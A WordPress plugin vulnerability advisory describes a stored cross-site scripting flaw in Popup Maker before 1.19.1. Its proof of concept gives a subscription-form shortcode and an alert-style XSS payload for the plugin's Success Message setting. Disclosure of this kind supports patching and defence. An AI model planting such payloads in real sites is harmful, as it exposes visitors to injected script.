## WordPress Plugin Vulnerabilities

# Popup Maker < 1.19.1 - Admin+ Stored XSS

### Description

The plugin does not sanitise and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered\_html capability is disallowed (for example in multisite setup)

### Proof of Concept

As admin, create/edit a post and put the following shortcode:
```
[pum\_sub\_form name\_field\_type="fullname" label\_name="Name" label\_email="Email" label\_submit="Subscribe" placeholder\_name="Name" placeholder\_email="Email" form\_layout="block" form\_alignment="center" form\_style="default" privacy\_consent\_enabled="yes" privacy\_consent\_label="Notify me about related content and special offers." privacy\_consent\_type="radio" privacy\_consent\_radio\_layout="inline" privacy\_consent\_yes\_label="Yes" privacy\_consent\_no\_label="No" privacy\_usage\_text="If you opt in above we use this information send related content, discounts and other special offers."].
```
Go to the settings of the plugin and put the following payload in the "Success Message" field of the Subscriptions section <img src=x onerror=alert(/XSS/)> and save
The XSS will be trigged after a user submit the form added to the post in the first step
